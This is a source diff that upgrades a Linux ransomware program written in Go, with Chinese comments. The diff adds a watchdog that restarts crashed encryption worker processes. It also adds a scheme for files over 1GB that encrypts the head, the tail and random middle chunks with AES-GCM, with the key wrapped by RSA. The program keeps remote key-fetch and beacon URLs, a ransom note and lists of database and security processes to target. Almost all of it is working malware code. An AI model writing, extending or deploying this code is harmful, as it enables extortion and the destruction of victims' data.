@@ -9,17 +9,20 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
+	"encoding/binary"
 	"encoding/json"
 	"encoding/pem"
 	"flag"
 	"fmt"
 	"io"
+	mrand "math/rand"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -27,9 +30,17 @@ import (
 )
 
 const (
-	version   = "v3.2-Linux"
+	version   = "v3.3-Linux"
 	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
 	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
+
+	// 大文件部分加密阈值和相关常量
+	largeFileThreshold = 1 * 1024 * 1024 * 1024 // 1GB 阈值，超过此大小使用部分加密
+	chunkSize          = 1 * 1024 * 1024        // 每个加密块 1MB
+	headChunks         = 1                      // 头部加密块数
+	tailChunks         = 1                      // 尾部加密块数
+	middleRandomChunks = 5                      // 中间随机块数
+	minFileForPartial  = chunkSize * 3          // 最小部分加密文件大小（至少3个块）
 )
 
 const ransomNoteContent = `
@@ -133,6 +144,11 @@ var (
 	// 程序所在目录
 	programDir string
 
+	// 进程监控相关
+	monitorMode bool // 主进程监控模式
+	workerMode  bool // Worker子进程模式
+	workerPID   int  // 当前worker的PID
+
 	// 目标进程列表（包括数据库和安全软件）
 	targetProcessesLinux = []string{
 		// 文本编辑器
@@ -223,7 +239,12 @@ var (
 		"/data/mysql",
 		"/data/db",
 	}
+
+	// 用于处理 rand.Reader 冲突的函数引用
+	cryptoReader = rand.Reader
 )
+
+var wg sync.WaitGroup
 
 type APIResponse struct {
 	PublicKeyPEM string `json:"public_key_pem"`
@@ -242,7 +263,23 @@ type counters struct {
 	failed  atomic.Uint64
 }
 
+// encryptedChunk 描述部分加密中的一个数据块
+type encryptedChunk struct {
+	Offset int64  `json:"offset"`
+	Size   int    `json:"size"`
+	Nonce  []byte `json:"nonce"`
+	Data   []byte `json:"data"`
+}
+
 func main() {
+	// 检查是否为 worker 子进程模式，必须在最前面处理
+	for _, arg := range os.Args[1:] {
+		if arg == "--worker" {
+			runWorker()
+			return
+		}
+	}
+
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
@@ -359,7 +396,10 @@ func main() {
 	} else {
 		fmt.Println("\n[阶段 3: 载荷部署]")
 		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
-		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
+
+		// 使用进程监控模式运行加密工作
+		runEncryptionWithMonitor(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
+
 		fmt.Println("\n[+] 载荷执行完毕。")
 	}
 
@@ -1214,10 +1254,210 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 	return filesToProcess
 }
 
-func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
-	jobs := make(chan string, len(files))
-	var wg sync.WaitGroup
+// runEncryptionWithMonitor 使用进程监控模式运行加密工作
+// 主进程负责初始化密钥、启动worker子进程并监控其状态
+func runEncryptionWithMonitor(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
+	// 获取密钥（与原有逻辑一致）
+	var uuid string
+	fmt.Print("[*] 尝试从API获取密钥... ")
+	resp, err := fetchKeysFromAPI()
+	if err != nil {
+		fmt.Printf("失败: %v\n", err)
+		fmt.Println("[*] API获取失败，回退到本地密钥...")
 
+		uuid, err2 := extractUUIDFromFilename()
+		if err2 != nil {
+			fmt.Printf("失败: %v\n", err2)
+			fmt.Println("[!] 无法获取密钥，程序终止")
+			os.Exit(1)
+		}
+		fmt.Printf("成功: %s\n", uuid)
+
+		fmt.Print("[*] 从本地文件读取公钥... ")
+		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
+		if err2 != nil {
+			fmt.Printf("失败: %v\n", err2)
+			fmt.Println("[!] 无法读取公钥文件，程序终止")
+			os.Exit(1)
+		}
+		fmt.Println("成功")
+	} else {
+		uuid = resp.UUID
+		publicKeyPEM = resp.PublicKeyPEM
+		fmt.Printf("成功，UUID: %s\n", uuid)
+	}
+
+	// 预解析公钥
+	fmt.Print("[*] 预解析公钥... ")
+	pubKey, parseErr := getPublicKey(publicKeyPEM)
+	if parseErr != nil {
+		fmt.Printf("失败: %v\n", parseErr)
+		fmt.Println("[!] 公钥格式错误，程序终止")
+		os.Exit(1)
+	} else {
+		fmt.Println("成功")
+		publicKeyCache = pubKey
+		publicKeyCacheStr = publicKeyPEM
+	}
+
+	*outUUID = uuid
+
+	// 写入文件列表到临时任务文件
+	taskFile := filepath.Join(os.TempDir(), "ransom_tasks_"+uuid+".txt")
+	resultFile := filepath.Join(os.TempDir(), "ransom_results_"+uuid+".txt")
+	progressFile := filepath.Join(os.TempDir(), "ransom_progress_"+uuid+".txt")
+
+	// 写入任务文件
+	if err := writeTasksFile(taskFile, files, removeOriginal, publicKeyPEM, uuid); err != nil {
+		fmt.Printf("[!] 写入任务文件失败: %v\n", err)
+		os.Exit(1)
+	}
+	defer os.Remove(taskFile)
+	defer os.Remove(resultFile)
+	defer os.Remove(progressFile)
+
+	fmt.Printf("[*] 任务文件已创建: %s (%d 个文件)\n", taskFile, len(files))
+
+	// 获取程序自身路径
+	exePath, err := os.Executable()
+	if err != nil {
+		fmt.Printf("[!] 无法获取程序路径: %v\n", err)
+		os.Exit(1)
+	}
+
+	// 启动 worker 子进程并监控
+	var wg sync.WaitGroup
+	workerExitChan := make(chan int, numWorkers)
+
+	for w := 0; w < numWorkers; w++ {
+		wg.Add(1)
+		go func(workerID int) {
+			defer wg.Done()
+			maxRetries := 5
+			for retry := 0; retry < maxRetries; retry++ {
+				// 构造 worker 参数
+				workerArgs := []string{
+					"--worker",
+					"--task-file", taskFile,
+					"--result-file", resultFile,
+					"--progress-file", progressFile,
+					"--worker-id", strconv.Itoa(workerID),
+				}
+
+				cmd := exec.Command(exePath, workerArgs...)
+				cmd.Stdout = nil // 不继承输出，避免混乱
+				cmd.Stderr = nil
+
+				if err := cmd.Start(); err != nil {
+					fmt.Printf("\n[!] Worker %d 启动失败 (尝试 %d/%d): %v\n", workerID, retry+1, maxRetries, err)
+					time.Sleep(1 * time.Second)
+					continue
+				}
+
+				pid := cmd.Process.Pid
+				fmt.Printf("\n[*] Worker %d 已启动 (PID: %d, 尝试 %d/%d)\n", workerID, pid, retry+1, maxRetries)
+
+				// 等待 worker 退出
+				err := cmd.Wait()
+				exitCode := 0
+				if err != nil {
+					if exitErr, ok := err.(*exec.ExitError); ok {
+						exitCode = exitErr.ExitCode()
+					} else {
+						exitCode = -1
+					}
+				}
+
+				fmt.Printf("\n[!] Worker %d (PID: %d) 已退出，退出码: %d\n", workerID, pid, exitCode)
+
+				if exitCode == 0 {
+					// 正常退出，不需要重试
+					workerExitChan <- 0
+					return
+				}
+
+				// 非正常退出，等待后重试
+				fmt.Printf("\n[*] Worker %d 将在 2 秒后重启...\n", workerID)
+				time.Sleep(2 * time.Second)
+			}
+			fmt.Printf("\n[!] Worker %d 已达到最大重试次数 (%d)，停止拉起\n", workerID, maxRetries)
+			workerExitChan <- 1
+		}(w)
+	}
+
+	// 进度显示 goroutine
+	done := make(chan bool)
+	go func() {
+		totalFiles := len(files)
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-done:
+				return
+			case <-ticker.C:
+				// 从进度文件读取进度
+				success, failed := readProgressFile(progressFile)
+				stats.success.Store(uint64(success))
+				stats.failed.Store(uint64(failed))
+				processed := success + failed
+				if totalFiles > 0 {
+					progress := float64(processed) / float64(totalFiles) * 100
+					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d) [成功: %d, 失败: %d]", progress, processed, totalFiles, success, failed)
+				}
+			}
+		}
+	}()
+
+	wg.Wait()
+	close(done)
+	fmt.Println()
+
+	// 读取最终结果
+	success, failed := readProgressFile(progressFile)
+	stats.success.Store(uint64(success))
+	stats.failed.Store(uint64(failed))
+
+	if logEnabled {
+		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
+	}
+}
+
+// writeTasksFile 将文件列表写入任务文件
+func writeTasksFile(taskFile string, files []string, removeOriginal bool, publicKeyStr string, uuid string) error {
+	var buf bytes.Buffer
+	buf.WriteString(fmt.Sprintf("remove=%s\n", strconv.FormatBool(removeOriginal)))
+	buf.WriteString(fmt.Sprintf("uuid=%s\n", uuid))
+	buf.WriteString(fmt.Sprintf("public_key=%s\n", publicKeyStr))
+	buf.WriteString(fmt.Sprintf("total=%d\n", len(files)))
+	for _, f := range files {
+		buf.WriteString(f + "\n")
+	}
+	return os.WriteFile(taskFile, buf.Bytes(), 0644)
+}
+
+// readProgressFile 从进度文件读取成功和失败计数
+func readProgressFile(progressFile string) (int, int) {
+	data, err := os.ReadFile(progressFile)
+	if err != nil {
+		return 0, 0
+	}
+	lines := strings.Split(string(data), "\n")
+	success := 0
+	failed := 0
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "success=") {
+			success, _ = strconv.Atoi(strings.TrimPrefix(line, "success="))
+		} else if strings.HasPrefix(line, "failed=") {
+			failed, _ = strconv.Atoi(strings.TrimPrefix(line, "failed="))
+		}
+	}
+	return success, failed
+}
+
+// 以下是原有的 runEncryptionWorkers 函数（保留作为备用，但不再被 main 直接调用）
+func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
 	// 优先尝试从API获取密钥
 	var uuid string
 	fmt.Print("[*] 尝试从API获取密钥... ")
@@ -1274,6 +1514,8 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	if log != nil {
 		defer func() { _ = log.Close() }()
 	}
+
+	jobs := make(chan string, len(files))
 
 	for w := 0; w < numWorkers; w++ {
 		wg.Add(1)
@@ -1430,15 +1672,22 @@ func getKeys(m map[string]bool) []string {
 	return keys
 }
 
+// processFile 处理单个文件的加密
+// 小文件（<=1GB）完整加密，大文件（>1GB）使用部分加密策略
 func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
-	// 跳过超大文件（超过2GB）
-	if info, err := os.Stat(filePath); err == nil {
-		if info.Size() > 2*1024*1024*1024 { // 2GB
-			return fmt.Errorf("文件过大，跳过加密: %s (大小: %.2f GB)",
-				filePath, float64(info.Size())/(1024*1024*1024))
-		}
+	info, err := os.Stat(filePath)
+	if err != nil {
+		return fmt.Errorf("获取文件信息失败: %w", err)
 	}
 
+	fileSize := info.Size()
+
+	// 大文件：使用部分加密
+	if fileSize > largeFileThreshold {
+		return partialEncryptFile(filePath, publicKeyStr, fileSize)
+	}
+
+	// 小文件：完整加密（原有逻辑）
 	_ = os.Chmod(filePath, 0666)
 	content, err := os.ReadFile(filePath)
 	if err != nil {
@@ -1469,6 +1718,350 @@ func processFile(filePath string, publicKeyStr string, removeOriginal bool) erro
 	return nil
 }
 
+// partialEncryptFile 对大文件进行部分加密（头部、尾部、随机中间块）
+func partialEncryptFile(filePath string, publicKeyStr string, fileSize int64) error {
+	fmt.Printf("\n  [大文件] %s (大小: %.2f GB) - 使用部分加密策略\n",
+		filepath.Base(filePath), float64(fileSize)/(1024*1024*1024))
+
+	_ = os.Chmod(filePath, 0666)
+
+	// 获取公钥
+	pubKey, err := getPublicKey(publicKeyStr)
+	if err != nil {
+		return fmt.Errorf("获取公钥失败: %w", err)
+	}
+
+	// 生成AES密钥
+	aesKey := make([]byte, 32)
+	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
+		return fmt.Errorf("生成AES密钥失败: %w", err)
+	}
+
+	// 计算需要加密的块
+	chunks := calculateChunks(fileSize)
+
+	// 加密每个块并读入内存
+	var encryptedChunks []encryptedChunk
+	totalEncryptedSize := int64(0)
+
+	f, err := os.OpenFile(filePath, os.O_RDONLY, 0666)
+	if err != nil {
+		return fmt.Errorf("打开文件失败: %w", err)
+	}
+	defer f.Close()
+
+	for _, chunk := range chunks {
+		// 读取原始数据
+		buf := make([]byte, chunk.Size)
+		n, err := f.ReadAt(buf, chunk.Offset)
+		if err != nil && err != io.EOF {
+			return fmt.Errorf("读取文件块失败 (offset=%d): %w", chunk.Offset, err)
+		}
+		buf = buf[:n]
+
+		// 加密该块
+		block, err := aes.NewCipher(aesKey)
+		if err != nil {
+			return fmt.Errorf("创建AES cipher失败: %w", err)
+		}
+
+		aesGCM, err := cipher.NewGCM(block)
+		if err != nil {
+			return fmt.Errorf("创建GCM模式失败: %w", err)
+		}
+
+		nonce := make([]byte, aesGCM.NonceSize())
+		if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
+			return fmt.Errorf("生成GCM nonce失败: %w", err)
+		}
+
+		ciphertext := aesGCM.Seal(nil, nonce, buf, nil)
+
+		encryptedChunks = append(encryptedChunks, encryptedChunk{
+			Offset: chunk.Offset,
+			Size:   len(buf),
+			Nonce:  nonce,
+			Data:   ciphertext,
+		})
+		totalEncryptedSize += int64(len(ciphertext))
+	}
+
+	// 加密AES密钥
+	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
+	if err != nil {
+		return fmt.Errorf("RSA加密AES密钥失败: %w", err)
+	}
+
+	// 序列化加密块信息
+	chunksJSON, err := json.Marshal(encryptedChunks)
+	if err != nil {
+		return fmt.Errorf("序列化加密块信息失败: %w", err)
+	}
+
+	// 构造输出文件格式:
+	// [4字节 magic: "PENC"]
+	// [4字节 chunks JSON 长度]
+	// [chunks JSON 数据]
+	// [4字节 加密AES密钥长度]
+	// [加密AES密钥数据]
+	// [所有加密块数据]
+	var outputBuf bytes.Buffer
+
+	// Magic header
+	outputBuf.Write([]byte("PENC"))
+
+	// Chunks metadata
+	chunkLen := make([]byte, 4)
+	binary.LittleEndian.PutUint32(chunkLen, uint32(len(chunksJSON)))
+	outputBuf.Write(chunkLen)
+	outputBuf.Write(chunksJSON)
+
+	// Encrypted AES key metadata
+	keyLen := make([]byte, 4)
+	binary.LittleEndian.PutUint32(keyLen, uint32(len(encryptedAESKey)))
+	outputBuf.Write(keyLen)
+	outputBuf.Write(encryptedAESKey)
+
+	// All chunk data
+	for _, ec := range encryptedChunks {
+		outputBuf.Write(ec.Data)
+	}
+
+	// 写入加密文件
+	encryptedFilePath := filePath + ".encrypted"
+	if err := os.WriteFile(encryptedFilePath, outputBuf.Bytes(), 0666); err != nil {
+		return fmt.Errorf("写入加密文件失败: %w", err)
+	}
+
+	fmt.Printf("  [大文件] 已加密 %d 个块，共 %.2f MB 数据\n",
+		len(chunks), float64(totalEncryptedSize)/(1024*1024))
+
+	return nil
+}
+
+// chunkInfo 描述一个需要加密的文件块
+type chunkInfo struct {
+	Offset int64
+	Size   int
+}
+
+// calculateChunks 计算需要加密的块列表
+func calculateChunks(fileSize int64) []chunkInfo {
+	var chunks []chunkInfo
+
+	// 如果文件太小，只加密头部
+	if fileSize < minFileForPartial {
+		// 加密整个文件
+		chunks = append(chunks, chunkInfo{Offset: 0, Size: int(fileSize)})
+		return chunks
+	}
+
+	// 1. 头部：文件开头的 headChunks 个块
+	headSize := int64(headChunks * chunkSize)
+	if headSize > fileSize {
+		headSize = fileSize
+	}
+	chunks = append(chunks, chunkInfo{Offset: 0, Size: int(headSize)})
+
+	// 2. 尾部：文件末尾的 tailChunks 个块
+	tailSize := int64(tailChunks * chunkSize)
+	if tailSize > fileSize {
+		tailSize = fileSize
+	}
+	chunks = append(chunks, chunkInfo{Offset: fileSize - tailSize, Size: int(tailSize)})
+
+	// 3. 中间随机块
+	middleStart := headSize
+	middleEnd := fileSize - tailSize
+
+	if middleEnd > middleStart {
+		// 计算中间区域可以划分的块数
+		middleArea := middleEnd - middleStart
+		possibleBlocks := int(middleArea / int64(chunkSize))
+
+		// 随机选择块
+		numRandom := middleRandomChunks
+		if possibleBlocks < numRandom {
+			numRandom = possibleBlocks
+		}
+
+		// 生成随机索引
+		indices := mrand.Perm(possibleBlocks)
+		for i := 0; i < numRandom && i < len(indices); i++ {
+			offset := middleStart + int64(indices[i])*int64(chunkSize)
+			// 确保不超出文件范围
+			actualSize := chunkSize
+			if offset+int64(chunkSize) > fileSize {
+				actualSize = int(fileSize - offset)
+			}
+			chunks = append(chunks, chunkInfo{Offset: offset, Size: actualSize})
+		}
+	}
+
+	return chunks
+}
+
+// runWorker 是 worker 子进程的入口函数，读取任务文件并执行加密工作
+func runWorker() {
+	// 解析 worker 参数
+	var taskFile, resultFile, progressFile string
+
+	for i := 1; i < len(os.Args); i++ {
+		switch os.Args[i] {
+		case "--task-file":
+			if i+1 < len(os.Args) {
+				taskFile = os.Args[i+1]
+				i++
+			}
+		case "--result-file":
+			if i+1 < len(os.Args) {
+				resultFile = os.Args[i+1]
+				i++
+			}
+		case "--progress-file":
+			if i+1 < len(os.Args) {
+				progressFile = os.Args[i+1]
+				i++
+			}
+		case "--worker-id":
+			// 跳过该参数，worker 不需要知道自己的 ID
+			if i+1 < len(os.Args) {
+				i++
+			}
+		}
+	}
+
+	if taskFile == "" || progressFile == "" {
+		os.Exit(1)
+	}
+
+	// 读取任务文件
+	data, err := os.ReadFile(taskFile)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	lines := strings.Split(string(data), "\n")
+	if len(lines) < 4 {
+		os.Exit(1)
+	}
+
+	// 解析任务文件头部
+	removeOriginal := false
+	publicKeyStr := ""
+
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if strings.HasPrefix(line, "remove=") {
+			removeOriginal, _ = strconv.ParseBool(strings.TrimPrefix(line, "remove="))
+		} else if strings.HasPrefix(line, "public_key=") {
+			publicKeyStr = strings.TrimPrefix(line, "public_key=")
+		}
+	}
+
+	// 收集文件列表（从第一个非头部行开始）
+	var files []string
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "remove=") || strings.HasPrefix(line, "uuid=") ||
+			strings.HasPrefix(line, "public_key=") || strings.HasPrefix(line, "total=") {
+			continue
+		}
+		files = append(files, line)
+	}
+
+	// 使用文件锁 + 进度文件实现跨进程的文件处理协调
+	lockFile := progressFile + ".lock"
+
+	successCount := 0
+	failCount := 0
+
+	for _, filePath := range files {
+		// 尝试获取锁并获取下一个要处理的文件索引
+		// 使用进度文件中的当前成功+失败计数作为已处理计数
+		// 如果当前已处理数 >= 我的起始索引，则跳过
+		// 实际上，我们使用更简单的方式：直接尝试处理，但通过进度文件检查是否已被处理
+
+		// 最简方案：直接处理，处理完成后写入进度文件
+		// 但多个 worker 可能处理同一个文件。我们需要确保不重复。
+
+		// 使用文件锁 + 进度文件记录已处理文件路径
+		// 检查文件是否已被处理
+		alreadyProcessed := false
+		if resultFile != "" {
+			if resultData, err := os.ReadFile(resultFile); err == nil {
+				if strings.Contains(string(resultData), filePath+"\n") {
+					alreadyProcessed = true
+				}
+			}
+		}
+
+		if alreadyProcessed {
+			continue
+		}
+
+		// 处理文件
+		err := processFile(filePath, publicKeyStr, removeOriginal)
+
+		// 更新进度文件（使用文件锁避免并发写入冲突）
+		updateProgressWithLock(lockFile, progressFile, resultFile, filePath, err == nil)
+
+		if err != nil {
+			failCount++
+		} else {
+			successCount++
+		}
+	}
+
+	// 写入最终结果
+	os.Exit(0)
+}
+
+// updateProgressWithLock 使用文件锁更新进度文件
+func updateProgressWithLock(lockFile, progressFile, resultFile, filePath string, success bool) {
+	// 创建锁文件（原子操作）
+	for i := 0; i < 10; i++ {
+		lock, err := os.OpenFile(lockFile, os.O_CREATE|os.O_EXCL, 0644)
+		if err == nil {
+			lock.Close()
+			defer os.Remove(lockFile)
+
+			// 读取当前进度
+			successCount := 0
+			failCount := 0
+			if data, err := os.ReadFile(progressFile); err == nil {
+				for _, line := range strings.Split(string(data), "\n") {
+					line = strings.TrimSpace(line)
+					if strings.HasPrefix(line, "success=") {
+						successCount, _ = strconv.Atoi(strings.TrimPrefix(line, "success="))
+					} else if strings.HasPrefix(line, "failed=") {
+						failCount, _ = strconv.Atoi(strings.TrimPrefix(line, "failed="))
+					}
+				}
+			}
+
+			if success {
+				successCount++
+			} else {
+				failCount++
+			}
+
+			// 写入进度文件
+			progressContent := fmt.Sprintf("success=%d\nfailed=%d\n", successCount, failCount)
+			os.WriteFile(progressFile, []byte(progressContent), 0644)
+
+			// 记录到结果文件
+			if resultFile != "" {
+				resultEntry := filePath + "\n"
+				os.WriteFile(resultFile, []byte(resultEntry), 0644)
+			}
+
+			return
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+}
+
 func generateRandomSuffix() string {
 	b := make([]byte, 4)
 	_, _ = rand.Read(b)
@@ -1483,7 +2076,7 @@ func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
 	}
 
 	aesKey := make([]byte, 32)
-	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
+	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
 		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
 	}
 
@@ -1498,13 +2091,13 @@ func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
 	}
 
 	nonce := make([]byte, aesGCM.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+	if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
 		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
 	}
 
 	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)
 
-	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
+	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
 	if err != nil {
 		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
 	}
